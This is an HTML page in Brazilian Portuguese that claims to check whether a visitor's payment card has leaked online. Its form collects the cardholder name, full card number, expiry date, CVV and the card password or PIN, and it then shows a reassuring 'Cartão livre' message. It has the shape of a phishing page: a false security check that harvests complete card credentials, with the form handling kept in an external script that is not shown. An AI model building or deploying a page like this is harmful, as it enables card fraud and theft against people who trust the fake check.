<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Cartão</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h2 class="titulo-celular">Veja se seu cartão vazou na internet</h2>

        <div class="cartao">
            <div class="frente">
                <div class="banco">Nome do Banco</div>
                <div class="chip"></div>
                <div class="numero">0000 0000 0000 0000</div>
                <div class="nome">Nome no cartão</div>
            </div>
            <div class="verso">
                <div class="faixa"></div>
                <div class="cvv">000</div>
            </div>
        </div>
        <div class="formulario">
            <h2 class="titulo">Veja se seu cartão <span>vazou</span> na internet</h2>
            <form id="form-cartao">
                <div class="input-column">                
                    <label>Nome no cartão</label>
                    <input type="text" id="nome" required>
                    <div id="erro-nome" class="erro"></div> <!-- Div de erro para o nome -->
                </div>

                <div class="input-column">
                    <label>Número do cartão</label>
                    <input type="text" placeholder="1234 5678 9012 3456" id="numero" maxlength="16" required>
                    <div id="erro-numero" class="erro"></div> <!-- Div de erro para o número -->
                </div>

                <div class="linha">
                    <div class="input-column">
                        <label>Data de expiração</label>
                        <input type="text" placeholder="MM/AA" id="validade" maxlength="5" required pattern="\d{2}\/\d{2}">
                        <div id="erro-validade" class="erro"></div> <!-- Div de erro para a validade -->
                    </div>
                    <div class="input-column">
                        <label>CVV</label>
                        <input type="text" placeholder="000" id="cvv" maxlength="3" required pattern="\d{3}">
                        <div id="erro-cvv" class="erro"></div> <!-- Div de erro para o CVV -->
                    </div>
                </div>

                <div class="input-column">
                    <label>Senha do cartão</label>
                    <input type="password" placeholder="***************" id="senha">
                    <div id="erro-senha" class="erro"></div> <!-- Div de erro para a senha -->
                </div>

                <button type="submit">Verificar</button>
            </form>
        </div>
    </div>
    <script src="app.js"></script>
    <div id="modal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <p>Cartão livre</p>
        </div>
    </div>
    
</body>
</html>
